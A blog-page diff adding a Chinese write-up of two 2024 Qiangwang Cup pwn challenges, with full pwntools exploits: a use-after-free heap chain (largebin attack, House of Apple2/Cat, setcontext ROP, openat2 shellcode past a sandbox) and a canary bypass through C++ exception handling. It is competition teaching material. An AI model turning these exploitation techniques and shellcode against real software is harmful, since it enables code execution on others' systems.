@@ -6,19 +6,52 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>tags | NEWYM</title>
+  <title>2024强网杯部分pwn | NEWYM</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta property="og:type" content="website">
-<meta property="og:title" content="tags">
-<meta property="og:url" content="http://example.com/tags/index.html">
+  <meta name="description" content="题目名称baby_heap操作内容：这道题说实在想复杂了，也算是我知识浅薄吧，看到那个环境变量没想到怎么用 跟对队友交流一直在用io进行攻击 两种做法： 先说我们最开始的做法 主要手法：一次部署并largetbin attack+House of apple2 + house of cat +rop+shellcode攻击 存在uaf漏洞 首先堆块申请被限制了且只有一次修改的机会  这让我">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024强网杯部分pwn">
+<meta property="og:url" content="http://example.com/2024/11/06/2024%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E9%83%A8%E5%88%86wp/index.html">
 <meta property="og:site_name" content="NEWYM">
+<meta property="og:description" content="题目名称baby_heap操作内容：这道题说实在想复杂了，也算是我知识浅薄吧，看到那个环境变量没想到怎么用 跟对队友交流一直在用io进行攻击 两种做法： 先说我们最开始的做法 主要手法：一次部署并largetbin attack+House of apple2 + house of cat +rop+shellcode攻击 存在uaf漏洞 首先堆块申请被限制了且只有一次修改的机会  这让我">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2024-07-11T06:20:01.000Z">
-<meta property="article:modified_time" content="2024-07-11T06:20:01.981Z">
+<meta property="og:image" content="http://example.com/phto/1730967042543.png">
+<meta property="og:image" content="http://example.com/phto/1730967058971.png">
+<meta property="og:image" content="http://example.com/phto/1730967068121.png">
+<meta property="og:image" content="http://example.com/phto/1730967075921.png">
+<meta property="og:image" content="http://example.com/phto/1730967081753.png">
+<meta property="og:image" content="http://example.com/phto/1730967090227.png">
+<meta property="og:image" content="http://example.com/phto/1730967096674.png">
+<meta property="og:image" content="http://example.com/phto/1730967102826.png">
+<meta property="og:image" content="http://example.com/phto/1730967107695.png">
+<meta property="og:image" content="http://example.com/phto/1730967113880.png">
+<meta property="og:image" content="http://example.com/phto/1730967117889.png">
+<meta property="og:image" content="http://example.com/phto/1730967140409.png">
+<meta property="og:image" content="http://example.com/phto/1730967155737.png">
+<meta property="og:image" content="http://example.com/phto/1730967171402.png">
+<meta property="og:image" content="http://example.com/phto/1730967177727.png">
+<meta property="og:image" content="http://example.com/phto/1730967263971.png">
+<meta property="og:image" content="http://example.com/phto/1730967273996.png">
+<meta property="og:image" content="http://example.com/phto/1730967313984.png">
+<meta property="og:image" content="http://example.com/phto/1730967304902.png">
+<meta property="og:image" content="http://example.com/phto/1730967321530.png">
+<meta property="og:image" content="http://example.com/phto/1730967328094.png">
+<meta property="og:image" content="http://example.com/phto/1730967336029.png">
+<meta property="og:image" content="http://example.com/phto/1730967350505.png">
+<meta property="og:image" content="http://example.com/phto/1730967356393.png">
+<meta property="og:image" content="http://example.com/phto/1730967361387.png">
+<meta property="og:image" content="http://example.com/phto/1730967364342.png">
+<meta property="og:image" content="http://example.com/phto/1730967371959.png">
+<meta property="og:image" content="http://example.com/phto/1730967380666.png">
+<meta property="og:image" content="http://example.com/phto/1730967386227.png">
+<meta property="article:published_time" content="2024-11-06T08:18:16.000Z">
+<meta property="article:modified_time" content="2024-11-07T08:17:37.159Z">
 <meta property="article:author" content="NEWYM">
+<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/phto/1730967042543.png">
   
     <link rel="alternative" href="/atom.xml" title="NEWYM" type="application/atom+xml">
   
@@ -179,14 +212,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-2024强网杯pwn部分wp" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      tags
+      2024强网杯部分pwn
     </h1>
   
 
@@ -198,8 +231,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/tags/index.html" class="archive-article-date">
-        <time datetime="2024-07-11T06:20:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-11</time>
+<a href="/2024/11/06/2024%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E9%83%A8%E5%88%86wp/" class="archive-article-date">
+        <time datetime="2024-11-06T08:18:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-11-06</time>
 </a>
 
   
@@ -212,7 +245,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">0字</span>
+      <span class="post-count">2k字</span>
     </span>
   </span>
 
@@ -221,7 +254,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">1分</span>
+      <span class="post-count">9分</span>
     </span>
   </span>
 </div>
@@ -232,7 +265,109 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    
+    <span id="more"></span>
+
+<!-- more -->
+
+<h3 id="题目名称baby-heap"><a href="#题目名称baby-heap" class="headerlink" title="题目名称baby_heap"></a>题目名称baby_heap</h3><h3 id="操作内容："><a href="#操作内容：" class="headerlink" title="操作内容："></a>操作内容：</h3><p>这道题说实在想复杂了，也算是我知识浅薄吧，看到那个环境变量没想到怎么用</p>
+<p>跟对队友交流一直在用io进行攻击</p>
+<p>两种做法：</p>
+<p>先说我们最开始的做法</p>
+<p>主要手法：一次部署并largetbin attack+House of apple2 + house of cat +rop+shellcode攻击</p>
+<p>存在uaf漏洞</p>
+<p>首先堆块申请被限制了且只有一次修改的机会</p>
+<p><img src="/../phto/1730967042543.png" alt="1730967042543"></p>
+<p>这让我们非常的困扰如何进行IO攻击</p>
+<p>我给队友假设我们可以在一个堆块里控制bk_nextsize为_IO_list_all-0x20的位置，并部署好IO_FILE结构体以及_IO_str_jumps表的内容</p>
+<p>然后我的队友想起来了曾看过学长的文章有关这个内容</p>
+<p><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/19609dd.html?highlight=house+of+apple">https://zikh26.github.io/posts/19609dd.html?highlight=house+of+apple</a></p>
+<p>最终得到了答案，在申请一个同样大小的小堆块即可</p>
+<p><img src="/../phto/1730967058971.png" alt="1730967058971"></p>
+<p>解决了这个问题</p>
+<p><img src="/../phto/1730967068121.png" alt="1730967068121"></p>
+<p>此时并为申请小堆块</p>
+<p>申请小堆块后</p>
+<p><img src="/../phto/1730967075921.png" alt="1730967075921"></p>
+<p>就可以达到一次性largetbin attack并部署IO结构</p>
+<p>进行部署IO</p>
+<p><img src="/../phto/1730967081753.png" alt="1730967081753"></p>
+<p>先进行了house of apple2的构造</p>
+<p>但是但是house of apple2是不行的，本题开启了沙箱</p>
+<p><img src="/../phto/1730967090227.png" alt="1730967090227"></p>
+<p>禁用了execve显然无法直接利用house of apple2的控制执行流就能攻击成功</p>
+<p>利用house of cat</p>
+<p>把_IO_switch_to_wget_mode中最后调用的最后调用的[rax + 0x18]设置为setcontext</p>
+<p><img src="/../phto/1730967096674.png" alt="1730967096674"></p>
+<p>你会发现rax的位置在我们的IO空间中</p>
+<p><img src="/../phto/1730967102826.png" alt="1730967102826"></p>
+<p>然后就是劫持程序流到我们我们的rop链上</p>
+<p><img src="/../phto/1730967107695.png" alt="1730967107695"></p>
+<p>先用mprotect申请一段部署shellcode的地址</p>
+<p><img src="/../phto/1730967113880.png" alt="1730967113880"></p>
+<p>然后执行到shellcode用openat2(系统调用号为 0x1b5)绕过沙箱</p>
+<p>将falg读取出来，多亏队友我都不知道这个函数</p>
+<p><img src="/../phto/1730967117889.png" alt="1730967117889"></p>
+<p>然后用sendline将flag发送过来</p>
+<p><img src="/../phto/1730967140409.png" alt="1730967140409"></p>
+<p>此方法未用到一次任意地址内容写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">from tools import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">p=process(&#x27;./qw3&#x27;)</span><br><span class="line"># p = remote(&quot;47.94.237.181&quot;, 28870)</span><br><span class="line">e=ELF(&quot;./qw3&quot;)</span><br><span class="line">libc=ELF(&quot;./libc-2.35.so&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size):</span><br><span class="line">   p.sendlineafter(&quot;choice:&quot;,b&#x27;1&#x27;)</span><br><span class="line">   p.sendlineafter(&quot;size&quot;,str(size))</span><br><span class="line">def free(idx):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;delete:&quot;,str(idx))</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;edit:&quot;,str(idx))</span><br><span class="line">    p.sendafter(&quot;content&quot;,content)</span><br><span class="line">def show(idx):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;show:&quot;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x718)#0</span><br><span class="line">add(0x600)#1</span><br><span class="line">add(0x708)#2</span><br><span class="line">free(1)</span><br><span class="line">add(0x900)#3</span><br><span class="line"></span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;\x65\x20\x0a&quot;)</span><br><span class="line"></span><br><span class="line">addr=u64(p.recv(8))-0x21b190</span><br><span class="line">p.recv(8)</span><br><span class="line">heap=u64(p.recv(8))-0x1950</span><br><span class="line">log_addr(&quot;heap&quot;)</span><br><span class="line">log_addr(&quot;addr&quot;)</span><br><span class="line">io_list_all=libc.sym[&#x27;_IO_list_all&#x27;]+addr-0x20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IO_wide_data_addr=0x002c90+heap#file_addr</span><br><span class="line">wide_vtable_addr = (heap+0x2c90+0xd8 + 8 + 8)-0x68</span><br><span class="line">setcontext = addr + libc.sym[&quot;setcontext&quot;] + 61</span><br><span class="line">flag = heap + 0x1a40</span><br><span class="line">rdii = addr + 0x21b570 + flag</span><br><span class="line">one = addr + 0x10d9cf</span><br><span class="line">gets = addr + libc.sym[&quot;gets&quot;]</span><br><span class="line">ret = addr+0x216f88-0x18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = 0x000000000002a3e5+addr#: pop rdi; ret; </span><br><span class="line">mprotect = addr + libc.sym[&quot;mprotect&quot;]</span><br><span class="line">pop_rax = addr + 0x0000000000045eb0#: pop rax; ret; </span><br><span class="line">pop_rsi = addr + 0x000000000002be51#: pop rsi; ret; </span><br><span class="line">pop_rdx_r12 = addr + 0x000000000011f2e7#: pop rdx; pop r12; ret;</span><br><span class="line">syscall = addr + 0x0000000000091316 #: syscall; ret; </span><br><span class="line">fake_io_addr = heap+ 0x1950</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">next_chain = 0</span><br><span class="line">fake_IO_FILE=p64(0)*3       #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(io_list_all) + p64(0)*2</span><br><span class="line">fake_IO_FILE +=p64(1)+p64(2) # rcx!=0(FSOP)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+0xb0)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(setcontext)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x58, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(0)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x78, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(heap+0x1000)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0x90, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+0x30)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xb0, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(1) #mode=1</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(0xc8, b&#x27;\x00&#x27;)</span><br><span class="line">fake_IO_FILE += p64(ret)  # vtable=IO_wfile_jumps+0x10</span><br><span class="line">fake_IO_FILE +=p64(0)*6</span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+0x40)</span><br><span class="line">fake_IO_FILE+= p64(0)*7 + p64(heap+0x1aa0+0x10) + p64(pop_rdi+1)</span><br><span class="line"></span><br><span class="line">rop = p64(pop_rdi) + p64(heap) + p64(pop_rsi) + p64(0x3000) + p64(pop_rdx_r12) + p64(7)*2</span><br><span class="line">rop+= p64(mprotect)</span><br><span class="line">rop+= p64(heap+ 0x1b00) + p64(0)</span><br><span class="line"></span><br><span class="line">shellcode = b&quot;\x48\x31\xff\x48\xb8\x2f\x66\x6c\x61\x67\x00\x00\x00\x50\x54\x5e\x6a\x00\x6a\x00\x6a\x00\x54\x5a\x6a\x18\x41\x5a\x68\xb5\x01\x00\x00\x58\x0f\x05&quot;</span><br><span class="line">shellcode += b&quot;\x6a\x01\x5f\x6a\x03\x5e\x6a\x40\x41\x5a\x6a\x00\x5a\x48\xc7\xc0\x28\x00\x00\x00\x0f\x05&quot;</span><br><span class="line">edit(1,fake_IO_FILE+rop+shellcode)</span><br><span class="line"></span><br><span class="line">free(3)</span><br><span class="line">add(0x800)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x708)</span><br><span class="line">log_addr(&quot;fake_io_addr&quot;)</span><br><span class="line">wide=fake_io_addr+0x30</span><br><span class="line">log_addr(&quot;wide&quot;)</span><br><span class="line">mi=wide+0x80+0x68</span><br><span class="line">log_addr(&quot;mi&quot;)</span><br><span class="line">debug(p,(addr+0x85782),(addr+0x53b2c))</span><br><span class="line">add(0x600)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>第二种写法 </p>
+<p>将环境变量内的flag读出来（我感觉这应该才是正解）</p>
+<p>泄露完libc后</p>
+<p>利用一次任意地址将写把改为puts，且第一题</p>
+<p><img src="/../phto/1730967155737.png" alt="1730967155737"></p>
+<p><img src="/../phto/1730967171402.png" alt="1730967171402"></p>
+<p>将USER环境变量换成flag？这样就可以作为我们后续的参数了</p>
+<p><img src="/../phto/1730967177727.png" alt="1730967177727"></p>
+<p>且环境变量会作为第一个参数</p>
+<p>这样就可以打印出来了</p>
+<p><img src="/../phto/1730967263971.png" alt="1730967263971"></p>
+<p> 最终的exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from tools import *</span><br><span class="line"></span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"># p=process(&#x27;./qw3&#x27;)</span><br><span class="line">p = remote(&quot;59.110.156.237&quot;,36906)</span><br><span class="line">e=ELF(&quot;./qw3&quot;)</span><br><span class="line">libc=ELF(&quot;./libc-2.35.so&quot;)</span><br><span class="line">def add(size):</span><br><span class="line">   p.sendlineafter(&quot;choice:&quot;,b&#x27;1&#x27;)</span><br><span class="line">   p.sendlineafter(&quot;size&quot;,str(size))</span><br><span class="line">def free(idx):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,b&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;delete:&quot;,str(idx))</span><br><span class="line">def edit(idx,content):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,b&#x27;3&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;edit:&quot;,str(idx))</span><br><span class="line">    p.sendafter(&quot;content&quot;,content)</span><br><span class="line">def show(idx):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,b&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;show:&quot;,str(idx))</span><br><span class="line">add(0x700)</span><br><span class="line">add(0x10)</span><br><span class="line">free(1)</span><br><span class="line">show(1)</span><br><span class="line">libc_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))-0x21ace0</span><br><span class="line">ABS= libc_addr + 0x0000021A118</span><br><span class="line">log_addr(&quot;libc_addr&quot;)</span><br><span class="line">log_addr(&quot;ABS&quot;)</span><br><span class="line">p.sendlineafter(&#x27;:&#x27;, b&#x27;0&#x27;)</span><br><span class="line">p.send(p64(ABS))</span><br><span class="line">puts_addr=libc_addr+libc.symbols[&#x27;puts&#x27;]</span><br><span class="line">payload=p64(puts_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendlineafter(&#x27;: &#x27;, b&#x27;5&#x27;)</span><br><span class="line">debug(p,libc_addr+0x44e39)</span><br><span class="line">p.sendline(b&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="题目名称expect-number"><a href="#题目名称expect-number" class="headerlink" title="题目名称expect_number"></a>题目名称expect_number</h3><h3 id="操作内容：-1"><a href="#操作内容：-1" class="headerlink" title="操作内容："></a>操作内容：</h3><p>最开始一直在尝试找到可以直接跳到后门的地方一直没找到</p>
+<p>然后去cat gift发现啥也没有</p>
+<p>最后发现我们读入位置的第一个有个地址，好奇看了看就找了到了新大陆</p>
+<p>存在栈溢出的地方，然后就绞尽脑汁计算修改0x60</p>
+<p>整体思路：</p>
+<p>\1.     利用算法进行改写对应影响rdx的值bss地址里面地址的低位改为0x60</p>
+<p>\2.     打印出来程序地址，得到基地址</p>
+<p>\3.     跳转到rdx对应的存在栈溢出的程序段</p>
+<p>\4.     覆盖返回地址到后门函数，且利用c++的异常检测绕过canary</p>
+<p>首先分析代码</p>
+<p><img src="/../phto/1730967273996.png" alt="1730967273996"></p>
+<p>存在一个 call rdx </p>
+<p><img src="/../phto/1730967313984.png" alt="1730967313984"></p>
+<p>重点函数，存在逻辑漏洞</p>
+<p><img src="/../phto/1730967304902.png" alt="1730967304902"></p>
+<p>每轮经过计算可以往*(a2 + ++<em>(a2 + 8) + 12)写入值，结果会在下一轮赋值在进行计算然后放入下一个</em>(a2 + ++*(a2 + 8) + 12)</p>
+<p><img src="/../phto/1730967321530.png" alt="1730967321530"></p>
+<p>计算的规律取决于v8，v8的种子是1，所以是不变的</p>
+<p><img src="/../phto/1730967328094.png" alt="1730967328094"></p>
+<p>且call rdx的rdx中的值取决于我们写入那个bss段+0x120的位置，且我们只要写的次数道280次就可以改这个值</p>
+<p><img src="/../phto/1730967336029.png" alt="1730967336029"></p>
+<p> <img src="/../phto/1730967350505.png" alt="1730967350505"></p>
+<p>把低位改成0x60就会执行到我们想要到的函数</p>
+<p>计算过程（从倒数39位开始算的）</p>
+<p><img src="/../phto/1730967356393.png" alt="1730967356393"></p>
+<p><img src="/../phto/1730967361387.png" alt="1730967361387"></p>
+<p>最终会执行</p>
+<p><img src="/../phto/1730967364342.png" alt="1730967364342"></p>
+<p>且我们要先show一下，泄露出程序地址</p>
+<p><img src="/../phto/1730967371959.png" alt="1730967371959"></p>
+<p><img src="/../phto/1730967380666.png" alt="1730967380666"></p>
+<p>存在溢出，但程序开了canary</p>
+<p>我们要利用c++的异常检测进行绕过canary就可以执行</p>
+<p><img src="/../phto/1730967386227.png" alt="1730967386227"></p>
+<p>​       </p>
+<h3 id="最终的exp"><a href="#最终的exp" class="headerlink" title="最终的exp"></a>最终的exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from tools import *</span><br><span class="line">from time import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">p=process(&#x27;./qw5&#x27;)</span><br><span class="line"># p=remote(&quot;39.106.54.211&quot;,26708)</span><br><span class="line">e=ELF(&quot;./qw5&quot;)</span><br><span class="line"></span><br><span class="line">def math(x):</span><br><span class="line">    p.sendlineafter(&quot;waiting for your choice&quot;,str(1))</span><br><span class="line">    p.sendlineafter(&quot; 2 or 1 or 0&quot;,str(x))</span><br><span class="line"></span><br><span class="line">def pri():</span><br><span class="line">    p.sendlineafter(&quot;waiting for your choice&quot;,str(2))</span><br><span class="line"></span><br><span class="line">def qqq():</span><br><span class="line">    p.sendlineafter(&quot;waiting for your choice&quot;,str(3))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def back():</span><br><span class="line">    p.sendlineafter(&quot;waiting for your choice&quot;,str(4))</span><br><span class="line">for i in range(2):</span><br><span class="line">   math(1)</span><br><span class="line">math(0)</span><br><span class="line">math(1)</span><br><span class="line">math(0)</span><br><span class="line">for i in range(3):</span><br><span class="line">   math(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(3):</span><br><span class="line">   math(0)</span><br><span class="line">for i in range(30):</span><br><span class="line">   math(1)</span><br><span class="line">for i in range(2):</span><br><span class="line">   math(0)</span><br><span class="line">for i in range(18):</span><br><span class="line">   math(1)</span><br><span class="line">for i in range(2):</span><br><span class="line">   math(0)</span><br><span class="line">for i in range(4):</span><br><span class="line">   math(1)</span><br><span class="line">for i in range(4):</span><br><span class="line">   math(0)</span><br><span class="line">for i in range(2):</span><br><span class="line">   math(1)</span><br><span class="line">for i in range(2):</span><br><span class="line">   math(0)</span><br><span class="line">for i in range(162):</span><br><span class="line">   math(1)</span><br><span class="line">#_______________________</span><br><span class="line">math(2)#1</span><br><span class="line">math(2)#1</span><br><span class="line">for i in range(5):</span><br><span class="line">   math(1)</span><br><span class="line"></span><br><span class="line">for i in range(3):</span><br><span class="line">   math(2)</span><br><span class="line">for i in range(3):</span><br><span class="line">   math(1)</span><br><span class="line">for i in range(3):</span><br><span class="line">   math(0)</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">   math(1)</span><br><span class="line">math(0) </span><br><span class="line">for i in range(3):</span><br><span class="line">   math(2)</span><br><span class="line">math(1) </span><br><span class="line">math(1) </span><br><span class="line">math(0) </span><br><span class="line">math(2)</span><br><span class="line">math(2)</span><br><span class="line">math(1)</span><br><span class="line">math(1)</span><br><span class="line">math(2)#0x30</span><br><span class="line">math(0)</span><br><span class="line">math(2)</span><br><span class="line">for i in range(4):</span><br><span class="line">   math(0)</span><br><span class="line">   pri()</span><br><span class="line">for i in range(3):</span><br><span class="line">   math(1)</span><br><span class="line">#________________________________________________________________</span><br><span class="line">pri()</span><br><span class="line"></span><br><span class="line">elf_addr = u64(p.recvuntil(&#x27;\x55&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) -  0x4c60</span><br><span class="line">log_addr(&quot;elf_addr&quot;)</span><br><span class="line">back()</span><br><span class="line">sleep(0.1)</span><br><span class="line">payload = b&#x27;k&#x27;*0x20+p64(elf_addr+0x5980) + p64(elf_addr+0x000000000000251a)</span><br><span class="line">sleep(0.1)</span><br><span class="line">p.send(payload)</span><br><span class="line">debug(p)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
     
 
     
@@ -246,7 +381,7 @@
         </li>
         <li>
           <strong>本文链接：</strong>
-          <a href="http://example.com/tags/index.html" title="tags" target="_blank">http://example.com/tags/index.html</a>
+          <a href="http://example.com/2024/11/06/2024强网杯pwn部分wp/" title="2024强网杯部分pwn" target="_blank">http://example.com/2024/11/06/2024强网杯pwn部分wp/</a>
         </li>
         
         <li>
@@ -263,7 +398,29 @@
   <div class="article-info article-info-index">
     
     
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">wp</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
     
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
